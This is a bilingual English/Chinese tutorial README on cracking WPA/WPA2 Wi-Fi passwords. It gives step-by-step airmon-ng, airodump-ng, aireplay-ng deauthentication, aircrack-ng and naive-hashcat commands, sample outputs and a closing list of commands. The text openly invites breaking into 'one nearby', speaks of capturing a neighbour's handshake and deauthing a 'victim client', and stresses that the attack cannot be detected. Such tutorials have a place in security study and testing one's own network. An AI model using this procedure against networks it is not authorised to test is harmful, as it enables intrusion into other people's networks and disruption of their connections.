# Wi-Fi破解

Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and [Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/). 

利用 Airodump-ng以及[Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/)破解WPA/WPA2 WI-FI路由器。

This is a brief walk-through tutorial that illustrates how to crack Wi-Fi networks that are secured using weak passwords. It is not exhaustive, but it should be enough information for you to test your own network's security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don't actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the [end of this document](#deauth-attack).

这是一个简要的按照步骤的教程，描述了如何破解使用弱密码保护的WI-FI网络。它不会极其详尽，但是对于你测试你自己的网络安全或者入侵附近网络已经包含足够的信息了。下面列出的攻击完全是被动的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。一个可选的破解认证的攻击可以用于加速侦查过程并且在[文档末尾](#deauth-attack)有描述。

If you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at [the bottom](#list-of-commands). For a variety of suggestions and alternative methods, see the [appendix](appendix.md).

如果你熟悉这个过程，你可以跳过这段描述直接跳到[底部](#命令列表)使用的命令列表。至于多种建议以及可行的方法，参考[附录](appendix.zh.md)。

__DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.

__声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。__

## Getting Started
## 入门

This tutorial assumes that you:
这个教程认为你：

- Have a general comfortability using the command-line
- Are running a debian-based linux distro, preferably [Kali linux](https://www.kali.org/) (OSX users see the [appendix](appendix.md))
- Have [Aircrack-ng](http://aircrack-ng.org/) installed
  - `sudo apt-get install aircrack-ng`
- Have a wireless card that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) (see [here](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html) for a list of supported devices)
- 可以流畅使用命令行
- 使用一个基于debian的linux发行版本，最好是[Kali linux](https://www.kali.org/)（OSX用户参考[附录](appendix.zh.md)）
- 安装[Aircrack-ng](http://aircrack-ng.org/)
  - `sudo apt-get install aircrack-ng`
- 无线网卡能够支持[监视模式](https://en.wikipedia.org/wiki/Monitor_mode)（对于支持的设备列表，参考[这](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html))

## Cracking a Wi-Fi Network
## 破解一个WI-FI网络

### Monitor Mode
### 监视模式

Begin by listing wireless interfaces that support monitor mode with:
开始通过下面的命令可以列出支持监视模式的无线接口：

```bash
airmon-ng
```

If you do not see an interface listed then your wireless card does not support monitor mode 😞
如果你看到没有列出一个接口，那么你的无线网卡就不支持监视模式 😞

We will assume your wireless interface name is `wlan0` but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:
我们将假设你的无线接口名称是`wlan0`，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监视模式：

```bash
airmon-ng start wlan0
```

Run `iwconfig`. You should now see a new monitor mode interface listed (likely `mon0` or `wlan0mon`).
运行`iwconfig`。你现在应该能够看到列出一个新的监视模式接口（像`mon0`或者`wlan0mon`）。

### Find Your Target
### 找到你的目标

Start listening to [802.11 Beacon frames](https://en.wikipedia.org/wiki/Beacon_frame) broadcast by nearby wireless routers using your monitor interface:
使用你的监视接口开始监听附近的[802.11 Beacon 帧](https://en.wikipedia.org/wiki/Beacon_frame)广播：

```bash
airodump-ng mon0
```

You should see output similar to what is below.
你应该可以看到类似于下面的输出。

```
CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         
                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   
 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          
 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>                                                        
 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                          
 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                 
 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin's Awesome                                                   
 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                 
 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                          
 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                    
 BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                
 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca
```

For the purposes of this demo, we will choose to crack the password of my network, "hackme". Remember the BSSID MAC address and channel (`CH`) number as displayed by `airodump-ng`, as we will need them both for the next step.
出于这个演示的目的，我们将会破解我自己的网络，"hackme"。记住利用`airodump-ng`展示的BSSID MAC地址以及信道（`CH`）号，因为在下一个步骤中我们将会需要它们。

### Capture a 4-way Handshake
### 捕获4路握手

WPA/WPA2 uses a [4-way handshake](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk) to authenticate devices to the network. You don't have to know anything about what that means, but you do have to capture one of these handshakes in order to crack the network password. These handshakes occur whenever a device connects to the network, for instance, when your neighbor returns home from work. We capture this handshake by directing `airmon-ng` to monitor traffic on the target network using the channel and bssid values discovered from the previous command.
WPA/WPA2使用[4路握手](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk)来认证设备连接网络。你不想要明白这些的含意，但是你必须捕获这些握手从而能够破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及bssid值来使用`airmon-ng`来监视目标网络。

```bash
# replace -c and --bssid values with the values of your target network
# 将-c以及--bssid值替换为你的目标网络值
# -w specifies the directory where we will save the packet capture
# -w制订了我们保存捕获数据包保存的文件夹
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
```
```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS  
```

Now we wait... Once you've captured a handshake, you should see something like `[ WPA handshake: bc:d3:c9:ef:d2:67` at the top right of the screen, just right of the current time. 
现在我们等待... 一旦我们捕捉到一个握手，你应该能够马上在屏幕的右上角看到类似于`[ WPA handshake: bc:d3:c9:ef:d2:67`的一些东西。

If you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to reconnect, be sending malicious deauthentication packets at them. This often results in the capture of a 4-way handshake. See the [deauth attack section](#deauth-attack) below for info on this. 
如果你已经感觉不耐烦了，并且希望实施一次攻击，你可以强制设备连接到目标网站来重新连接，并且在目标网络中发送恶意的解除验证数据包。这经常就能够捕获4路握手。参考下面的[deauth攻击章节](#deauth-attack)来获取关于此的信息。

Once you've captured a handshake, press `ctrl-c` to quit `airodump-ng`. You should see a `.cap` file wherever you told `airodump-ng` to save the capture (likely called `-01.cap`). We will use this capture file to crack the network password. I like to rename this file to reflect the network name we are trying to crack:
一旦你捕获了一个握手，按下`ctrl-c`来终止`airodump-ng`。你应该可以看到一个你告诉`airodump-ng`用来保存捕获信息的`.cap`文件（比如叫做`-01.cap`）。我们将会使用这个捕获文件来破解网络密码。我喜欢对这个文件重命名从而反映我们现在尝试破解的网络名称：

```bash
mv ./-01.cap hackme.cap
```

### Crack the Network Password
### 破解网络密码

The final step is to crack the password using the captured handshake. If you have access to a GPU, I **highly** recommend using `hashcat` for password cracking. I've created a simple tool that makes hashcat super easy to use called [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat). If you don't have access to a GPU, there are various online GPU cracking services that you can use, like [GPUHASH.me](https://gpuhash.me/) or [OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php). You can also try your hand at CPU cracking with Aircrack-ng.
最后一个步骤是使用捕获的握手来破解密码。如果你能够访问GPU，我**强烈**建议你使用`hashcat`来破解密码。我已经创建了一个叫做[`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat)的简单工具可以让使用hashcat变得非常方便。如果你不能够访问GPU，还有很多在线的GPU破解服务可以使用，比如[GPUHASH.me](https://gpuhash.me/)或者[OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php)。你也可以常使用Aircrack-ng来进行CPU破解。

Note that both attack methods below assume a relatively weak user generated password. Most WPA/WPA2 routers come with strong 12 character random passwords that many users (rightly) leave unchanged. If you are attempting to crack one of these passwords, I recommend using the [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) dictionary files.
注意下面的攻击方法都假设用户使用弱的密码。大多数WPA/WPA2路由自带12位强随机密码，大多数用户都不会去更改。如果你去尝试破解这些密码，我建议你使用[Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) 字典文件。

#### Cracking With `naive-hashcat` (recommended)
#### 使用`naive-hashcat`破解（推荐）

Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly.
在我们使用naive-hashcat破解密码之前，我们需要将我们的`.cap`文件转换成同等hashcat文件格式`.hccapx`。你可以通过上传`.cap`文件到<https://hashcat.net/cap2hccapx/> 或者直接使用[`cap2hccapx`](https://github.com/hashcat/hashcat-utils)工具。

```bash
cap2hccapx.bin hackme.cap hackme.hccapx
```

Next, download and run `naive-hashcat`:
接着，下载并且运行`naive-hashcat`：

```bash
# download
# 下载
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# download the 134MB rockyou dictionary file
# 下载134MBrockyou字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack ! baby ! crack !
# 破解！宝贝！破解！
# 2500是hashcat对于WPA/WPA2的哈希模式
# 2500 is the hashcat hash mode for WPA/WPA2
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Naive-hashcat uses various [dictionary](https://hashcat.net/wiki/doku.php?id=dictionary_attack), [rule](https://hashcat.net/wiki/doku.php?id=rule_based_attack), [combination](https://hashcat.net/wiki/doku.php?id=combinator_attack), and [mask](https://hashcat.net/wiki/doku.php?id=mask_attack) (smart brute-force) attacks and it can take days or even months to run against mid-strength passwords. The cracked password will be saved to hackme.pot, so check this file periodically. Once you've cracked the password, you should see something like this as the contents of your `POT_FILE`:
Naive-hashcat使用多种[字典](https://hashcat.net/wiki/doku.php?id=dictionary_attack)，[规则](https://hashcat.net/wiki/doku.php?id=rule_based_attack)，[组合](https://hashcat.net/wiki/doku.php?id=combinator_attack)以及[伪装](https://hashcat.net/wiki/doku.php?id=mask_attack)（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到hackme.pot，因此阶段性地检查这个文件。一旦你破解这个密码，你将会在你的`POI_FILE`看到类似于下面的内容：

```
e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
```

Where the last two fields separated by `:` are the network name and password respectively.
最后两块被`:`分隔开来，分别是网络名称和密码。

If you would like to use `hashcat` without `naive-hashcat` see [this page](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2) for info.
如果你希望不需要`naive-hashcat`来使用`hashcat`的话请参考[这个页面](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)。

#### Cracking With Aircrack-ng
#### 利用Aircrack-ng破解

Aircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:
Aircrack-ng可以用于在你的CPU上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的rockyou字典文件：

```bash
# download the 134MB rockyou dictionary file
# 下载134MBrockyou字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Note, that if the network password is not in the wordfile you will not crack the password.
注意，如果网络密码不再这个单词文件话，你将不能破解密码。

```bash
# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
# -a2指定WPA2，-b是BSSID，-w是单词文件
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
```

If the password is cracked you will see a `KEY FOUND!` message in the terminal followed by the plain text version of the network password.
如果密码被破解了，你将会在终端看到一个`KEY FOUND!`消息，在其后将会看到网络密码的纯文本。

```
                                 Aircrack-ng 1.2 beta3


                   [00:01:49] 111040 keys tested (1017.96 k/s)


                         KEY FOUND! [ hacktheplanet ]


      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 

      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 

      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
```

## Deauth Attack
## 解除认证攻击

A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. 
解除认证攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的“发件人”地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用`airodump-ng`进行侦听，则提供4路握手。

Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.
使用`airodump-ng`监视特定接入点（使用`-c channel --bssid MAC`），直到看到客户端（`STATION`）连接。 连接的客户端看起来像这样，`64：BC：0C：48：97：F7`是客户端MAC。

```
 CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
                                                                                                                                           
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
```

Now, leave `airodump-ng` running and open a new terminal. We will use the `aireplay-ng` command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.
现在，让`airodump-ng`运行并打开一个新的终端。 我们将使用`aireplay-ng`命令向我们的受害者客户端发送假的接触认证数据包，强制其重新连接到网络，并希望在此过程中抓取握手。

```bash
# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```

You can optionally broadcast deauth packets to all connected clients with:
你可以选择得通过广播接触认证数据包到所有连接的客户端：

```bash
# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```

Once you've sent the deauth packets, head back over to your `airodump-ng` process, and with any luck you should now see something like this at the top right: `[ WPA handshake: 9C:5C:8E:C9:AB:C0`. Now that you've captured a handshake you should be ready to [crack the network password](#cracking-the-network-password).
一旦你发送了解除认证数据包，回到你的`airodump-ng`进程，运气好的话你现在应该看到右上角：`[WPA握手：9C：5C：8E：C9：AB：C0`。 现在你已经捕获了握手，你应该准备好[破解网络密码](#crack-the-network-password)。

## List of Commands
## 命令列表

Below is a list of all of the commands needed to crack a WPA/WPA2 network, in order, with minimal explanation.
下面列出了破解WPA / WPA2网络所需的所有命令，以最少的解释为依据。

```bash
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## crack password with aircrack-ng... ##########

# download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

## Appendix
## 附录

The response to this tutorial was so great that I've added suggestions and additional material from community members as an [appendix](appendix.md). Check it out to learn how to:
对本教程的回应是非常好的，我已经添加了社区成员的建议和附加资料作为[附录](# appendix.zh.md)。看看如何：

- Capture handshakes and crack WPA passwords on MacOS/OSX
- Capture handshakes from every network around you with `wlandump-ng`
- Use `crunch` to generate 100+GB wordlists on-the-fly
- Spoof your MAC address with `macchanger`
- 在MacOS/OSX上捕获握手并且破解WPA密码
- 利用`wlandump-ng`捕获从你周围每个网络捕获握手
- 使用`crunch`即时生成100多GB的单词列表
-  利用`macchanger`伪造你的MAC地址

## Attribution
## 致谢

Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat. 
这里提供的大部分信息都是从[Lewis Encarnacion的绝妙的教程]（https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html）收集的。 感谢在Aircrack-ng和Hashcat上工作的优秀作者和维护者。

Shout out to [hiteshnayak305](https://github.com/hiteshnayak305), [enilfodne](https://github.com/enilfodne), [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [0XE4](https://github.com/0XE4), [hartzell](https://github.com/hartzell), [zeeshanu](https://github.com/zeeshanu), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
感谢[hiteshnayak305]（https://github.com/hiteshnayak305），[enilfodne](https://github.com/enilfodne)，[DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore)，[hivie7510](https://www.reddit.com/user/hivie7510)，[cprogrammer1994](https://github.com/cprogrammer1994)，[0XE4](https://github.com/0XE4)，[hartzell](https://github.com/hartzell)，[zeeshanu](https://github.com/zeeshanu)，[flennic](https://github.com/flennic)，[bhusang](https://github.com/bhusang)，[tversteeg](https://github.com/tversteeg)，[gpetrousov](https://github.com/gpetrousov)，[crowchirp](https://github.com/crowchirp)和[Shark0der](https://github.com/shark0der)，他们还在[Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/)和GitHub。如果您有兴趣听取WPA2的一些建议替代方案，请在[折](https://news.ycombinator.com/item?id=14840539)参考Hacker News的一些重要讨论。
